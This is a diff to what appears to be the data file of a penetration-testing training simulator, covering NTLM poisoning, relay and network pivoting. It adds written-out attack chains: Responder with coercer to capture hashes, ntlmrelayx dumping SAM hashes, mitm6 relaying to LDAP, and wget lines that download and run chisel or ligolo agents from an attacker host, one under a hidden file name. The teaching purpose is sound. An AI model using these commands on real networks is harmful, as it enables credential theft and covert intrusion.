@@ -1051,36 +1051,50 @@
 
     // ============================ CREDENTIALS & CRACKING ============================
     'responder-poison': {
-      cmd: 'sudo responder -I eth0 -w', tool: 'responder',
-      output: [
-        '[*] [LLMNR]  Poisoned answer sent to 10.10.10.50 for name fileshare',
-        '[SMB] NTLMv2-SSP Client   : 10.10.10.50',
-        '[SMB] NTLMv2-SSP Username : ACME\\jdoe',
-        '[SMB] NTLMv2-SSP Hash     : jdoe::ACME:1122334455667788:A1B2...:0101...',
-      ].join('\n'),
       signal: '[SMB] NTLMv2-SSP Username : ACME\\jdoe',
-      teach: 'When a Windows host mistypes a share name, it broadcasts asking "who is fileshare?". Responder answers "me", and the victim sends its NetNTLMv2 hash. You now have a hash to crack or relay — no exploit, just a protocol default.',
+      teach: 'Responder runs entirely on YOUR box — there is nothing to install on a target. It is PASSIVE: it only catches authentication that happens to come your way (a user mistyping a share name, so the host broadcasts "who is fileshare?" and Responder answers "me"). On a quiet network you could wait forever — so pair it with a coercion tool (coercer / PetitPotam / PrinterBug) to FORCE a chosen host to authenticate to you. Either way you walk away with a NetNTLMv2 hash to crack or relay.',
+      steps: [
+        { where: 'local', tool: 'responder', cmd: 'sudo responder -I eth0 -w', output: [
+          '[+] Poisoners: LLMNR, NBT-NS, MDNS',
+          '[+] Servers: SMB, HTTP, LDAP on',
+          '[+] Listening for events...',
+        ].join('\n') },
+        { where: 'local', tool: 'coercer', cmd: "coercer coerce -t 10.10.10.50 -l 10.10.14.5 -u jdoe -p 'Autumn2026!' -d acme.internal", output: [
+          '[+] DFSCoerce: 10.10.10.50 coerced to authenticate to 10.10.14.5',
+          '↩ caught in your Responder window:',
+          '[SMB] NTLMv2-SSP Username : ACME\\jdoe',
+          '[SMB] NTLMv2-SSP Hash     : jdoe::ACME:1122334455667788:A1B2...:0101...',
+        ].join('\n') },
+      ],
     },
     'ntlm-relay-attack': {
-      cmd: 'impacket-ntlmrelayx -tf relay-targets.txt -smb2support', tool: 'impacket-ntlmrelayx',
-      output: [
-        '[*] Servers started, waiting for connections',
-        '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED',
-        '[*] Dumping local SAM hashes',
-        'Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
-      ].join('\n'),
       signal: '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED',
-      teach: 'Relaying forwards a captured authentication to another host instead of cracking it — if SMB signing is off, the victim\'s auth logs you into a second machine as them. "SUCCEED" means you are in without ever knowing the password.',
+      teach: 'Relaying forwards a captured authentication to a SECOND host instead of cracking it — but ntlmrelayx, like Responder, only relays auth that comes IN to it. So you drive the traffic: coerce a target to authenticate (coercer / PetitPotam), and ntlmrelayx relays that to a machine where the victim is local admin (SMB signing off), dumping its SAM. "SUCCEED" means you are in without ever knowing the password.',
+      steps: [
+        { where: 'local', tool: 'impacket-ntlmrelayx', cmd: 'impacket-ntlmrelayx -tf relay-targets.txt -smb2support', output: '[*] Servers started, waiting for connections' },
+        { where: 'local', tool: 'coercer', cmd: "coercer coerce -t 10.10.10.50 -l 10.10.14.5 -u jdoe -p 'Autumn2026!' -d acme.internal", output: [
+          '[+] 10.10.10.50 coerced to authenticate to 10.10.14.5',
+          '↩ relayed by ntlmrelayx:',
+          '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED',
+          '[*] Dumping local SAM hashes',
+          'Administrator:500:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
+        ].join('\n') },
+      ],
     },
     'mitm6-ipv6-takeover': {
-      cmd: 'sudo mitm6 -i eth0 -d acme.internal', tool: 'mitm6',
-      output: [
-        '[*] IPv6 address assigned to victim 10.10.10.50 via rogue DHCPv6',
-        '[*] Victim queried WPAD — serving malicious proxy config',
-        '[*] Got credentials relayed to LDAP: ACME\\jdoe',
-      ].join('\n'),
-      signal: '[*] Got credentials relayed to LDAP: ACME\\jdoe',
-      teach: 'Windows prefers IPv6 and asks for a DHCPv6 server even when none is configured. mitm6 answers, becomes the victim\'s DNS, and (with ntlmrelayx) relays the auth it captures. A default-on protocol you did not know was running becomes the way in.',
+      signal: '[*] Authenticating against ldaps://10.10.10.10 as ACME\\jdoe SUCCEED',
+      teach: 'mitm6 runs on your box and abuses Windows\' preference for IPv6: it answers the DHCPv6 nobody configured, becomes the victim\'s DNS, and points WPAD at you — then ntlmrelayx relays the auth that follows to LDAP. It is not passive, but it does wait for a Windows host to renew (often a reboot or logon), so pair it with the relay and give it time.',
+      steps: [
+        { where: 'local', tool: 'mitm6', cmd: 'sudo mitm6 -i eth0 -d acme.internal', output: [
+          '[*] Sending rogue DHCPv6 replies; spoofing DNS for *.acme.internal',
+          '[*] IPv6 address assigned to victim 10.10.10.50',
+        ].join('\n') },
+        { where: 'local', tool: 'impacket-ntlmrelayx', cmd: 'impacket-ntlmrelayx -6 -t ldaps://10.10.10.10 -wh fakewpad.acme.internal -l loot', output: [
+          '[*] Victim queried WPAD — serving malicious proxy config',
+          '[*] Authenticating against ldaps://10.10.10.10 as ACME\\jdoe SUCCEED',
+          '[*] Domain info and delegation rights written to loot/',
+        ].join('\n') },
+      ],
     },
     'crack-identify': {
       cmd: 'nth -f hashes.txt', tool: 'name-that-hash',
@@ -1648,13 +1662,15 @@
     },
     'pivot-chisel-socks': {
       signal: 'client: tun: proxy#R:127.0.0.1:1080=>socks',
-      teach: 'Chisel builds a SOCKS proxy back through the compromised host: the SERVER runs on your box, the CLIENT on theirs (upload the chisel binary first). Then point proxychains at 127.0.0.1:1080 and your tools reach the internal network — the standard way to attack a subnet you can only touch through one box.',
+      teach: 'Chisel builds a SOCKS proxy back through the compromised host — but chisel is not on that host yet, so the chain is: start the reverse server on your box, serve the chisel binary, pull it down and run the client on the target, then point proxychains at 127.0.0.1:1080. After that your tools reach the internal network through the one box you own.',
       steps: [
         { where: 'local', tool: 'chisel', cmd: 'chisel server -p 8080 --reverse', output: [
           'server: Reverse tunnelling enabled',
           'server: Listening on http://0.0.0.0:8080',
         ].join('\n') },
-        { where: 'host', tool: 'chisel', cmd: './chisel client 10.10.14.5:8080 R:1080:socks', output: [
+        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding the chisel binary', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
+        { where: 'host', tool: 'wget', cmd: 'wget http://10.10.14.5:8000/chisel -O /tmp/chisel && chmod +x /tmp/chisel && /tmp/chisel client 10.10.14.5:8080 R:1080:socks', output: [
+          "Saved '/tmp/chisel' [8577024/8577024]",
           'client: Connected to http://10.10.14.5:8080',
           'client: tun: proxy#R:127.0.0.1:1080=>socks',
         ].join('\n') },
@@ -1663,16 +1679,17 @@
     },
     'pivot-ligolo': {
       signal: '[+] Route to 172.16.5.0/24 added via ligolo — internal subnet reachable',
-      teach: 'Ligolo-ng gives you a REAL network interface to the internal subnet — fast, and no proxychains. The setup is four beats, split across both machines: create the tun on your box, start the proxy, run the agent on the compromised host, then add the internal route. After that your box reaches 172.16.5.0/24 natively.',
+      teach: 'Ligolo-ng gives you a REAL network interface to the internal subnet — fast, no proxychains. But the agent is not on the host yet, so the full chain spans both machines: on your box create the tun, start the proxy, and serve the agent binary; on the target download it, make it executable and run it so it connects back; then on your box select the session and add the internal route. After that your box reaches 172.16.5.0/24 natively.',
       steps: [
-        { where: 'local', tool: 'ip', cmd: 'sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up', output: '# tun interface "ligolo" created and brought up (no output on success)' },
-        { where: 'local', tool: 'ligolo-proxy', cmd: 'ligolo-proxy -selfcert', output: [
+        { where: 'local', tool: 'ligolo-proxy', cmd: 'sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up && ligolo-proxy -selfcert', output: [
           'ligolo-proxy » Listening on 0.0.0.0:11601 (self-signed TLS)',
         ].join('\n') },
-        { where: 'host', tool: 'agent', cmd: './agent -connect 10.10.14.5:11601 -ignore-cert', output: [
+        { where: 'local', tool: 'python3', cmd: 'python3 -m http.server 8000   # from the dir holding the Linux "agent" binary', output: 'Serving HTTP on 0.0.0.0 port 8000 ...' },
+        { where: 'host', tool: 'wget', cmd: 'wget http://10.10.14.5:8000/agent -O /tmp/.a && chmod +x /tmp/.a && /tmp/.a -connect 10.10.14.5:11601 -ignore-cert', output: [
+          "Saved '/tmp/.a' [8724234/8724234]",
           'time="10:41:07" level=info msg="Connection established" addr="10.10.14.5:11601"',
         ].join('\n') },
-        { where: 'local', tool: 'ligolo-proxy', cmd: 'session  # pick the agent, then: sudo ip route add 172.16.5.0/24 dev ligolo', output: [
+        { where: 'local', tool: 'ligolo-proxy', cmd: 'session   # select the agent, then: sudo ip route add 172.16.5.0/24 dev ligolo', output: [
           'ligolo-proxy » [Agent] joined from 10.10.10.20 (ACME\\WS01)',
           '[+] Route to 172.16.5.0/24 added via ligolo — internal subnet reachable',
         ].join('\n') },
